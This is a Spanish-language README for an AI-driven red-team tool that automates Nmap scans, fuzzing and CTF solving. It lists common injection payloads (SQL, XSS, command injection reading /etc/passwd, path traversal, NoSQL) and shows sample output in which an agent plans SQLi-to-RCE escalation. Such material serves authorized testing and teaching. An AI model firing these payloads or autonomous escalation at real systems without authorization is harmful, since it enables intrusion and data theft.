# 🎯 Agentes de Seguridad Ofensiva (Red Teaming)

Agentes autónomos que utilizan capacidades de IA para simular ataques controlados, escaneo de red, fuzzing y resolución de retos CTF de forma autónoma.

## ✨ Características

- **🔍 Escaneo de Red**: Automatización de escaneos con Nmap
- **💉 Fuzzing**: Pruebas de inyección SQL, XSS, comandos, path traversal
- **🎮 CTF Solvers**: Agentes que resuelven retos de seguridad adaptativamente
- **🧠 Estrategia Adaptativa**: Modifica tácticas según resultados en tiempo real
- **📊 Reportes**: Documentación completa de hallazgos

## 🚀 Instalación

```bash
cd agentes-seguridad-redteam

# Instalar dependencias
pip install -r requirements.txt

# Instalar Nmap (requerido para escaneos de red)
# Ubuntu/Debian: sudo apt-get install nmap
# macOS: brew install nmap
# Windows: choco install nmap
```

## 📋 Requisitos

```
python 3.8+
nmap (opcional, para escaneos reales)
```

## 🎯 Uso

### Evaluación Completa

```bash
python redteam-agent.py target.com --mode full
```

### Escaneo de Red

```bash
python redteam-agent.py 192.168.1.1 --mode scan
```

### Fuzzing de Endpoints

```bash
python redteam-agent.py http://target.com --mode fuzz
```

### Resolver Reto CTF

```bash
# Reto web
python redteam-agent.py target --mode ctf --ctf-type web

# Reto criptográfico
python redteam-agent.py target --mode ctf --ctf-type crypto

# Reto de explotación
python redteam-agent.py target --mode ctf --ctf-type pwn
```

## 📊 Payloads Disponibles

### SQL Injection
- `' OR '1'='1' --`
- `' UNION SELECT null,null,null--`
- `' AND 1=1--`

### XSS
- `<script>alert('XSS')</script>`
- `<img src=x onerror=alert('XSS')>`
- `" onmouseover=alert('XSS')`

### Command Injection
- `; ls -la`
- `| cat /etc/passwd`
- `` `whoami` ``

### Path Traversal
- `../../../etc/passwd`
- `%2e%2e%2fetc%2fpasswd`
- `../../../etc/passwd%00.jpg`

### NoSQL Injection
- `{"$gt": ""}`
- `{"username": {"$ne": null}}`

## 🔍 Fases del Assessment

```
┌─────────────────────────────────────────────┐
│         RED TEAM ASSESSMENT                  │
├─────────────────────────────────────────────┤
│                                             │
│  FASE 1: RECONOCIMIENTO                     │
│  ├── Nmap scan                              │
│  ├── Detección de servicios                 │
│  └── OS fingerprinting                      │
│                                             │
│  FASE 2: ENUMERACIÓN                        │
│  ├── Descubrimiento de endpoints            │
│  ├── Fuzzing (SQLi, XSS, etc.)              │
│  └── Análisis de respuestas                 │
│                                             │
│  FASE 3: EXPLOTACIÓN                        │
│  ├── Estrategia adaptativa                  │
│  ├── Escalación de privilegios              │
│  └── Post-explotación                       │
│                                             │
│  FASE 4: REPORTE                            │
│  ├── Documentación de hallazgos            │
│  └── Recomendaciones                        │
│                                             │
└─────────────────────────────────────────────┘
```

## 📄 Ejemplo de Output

```
🎯 Iniciando Red Team Assessment: target.com
   Session ID: 20240415_143022

==================================================
FASE 1: RECONOCIMIENTO
==================================================
🔍 [NMAP] Escaneando target.com...
  📄 Puertos abiertos detectados:
     - 22/tcp (ssh - OpenSSH 8.2)
     - 80/tcp (http - nginx 1.18)
     - 443/tcp (https - nginx 1.18)

==================================================
FASE 2: ENUMERACIÓN
==================================================
🎯 [FUZZ] Probando /login?id=...
  🚨 Posible vulnerabilidad encontrada: SQLi Basic
  🚨 Posible vulnerabilidad encontrada: SQLi Union

==================================================
FASE 3: EXPLOTACIÓN ADAPTATIVA
==================================================
🎮 [CTF] Resolviendo reto: web
  🌐 Explorando aplicación web...

📋 Estrategia adaptada: {'next_action': 'escalate_sqli_to_rce', 'priority': 'high'}
```

## 🛠️ Extensión

### Agregar nuevos payloads

```python
payloads_db["mi_categoria"].append(
    Payload(
        name="Mi Payload",
        category="mi_categoria",
        content="...",
        severity="high",
        description="Descripción"
    )
)
```

### Agregar nuevos tipos de CTF

```python
def _solve_mi_categoria(self) -> Dict:
    return {
        "type": "mi_categoria",
        "method": "mi_metodo",
        "solved": True,
        "flag": "CTF{...}"
    }
```

## ⚠️ Disclaimer

**IMPORTANTE**: Esta herramienta es para fines educativos y pruebas de penetración autorizadas únicamente. El uso no autorizado de sistemas informáticos es ilegal. Asegúrate de tener permiso explícito antes de usar estas herramientas en cualquier sistema que no sea de tu propiedad.

## 📄 Licencia

MIT License - Uso educativo y de investigación de seguridad defensiva.
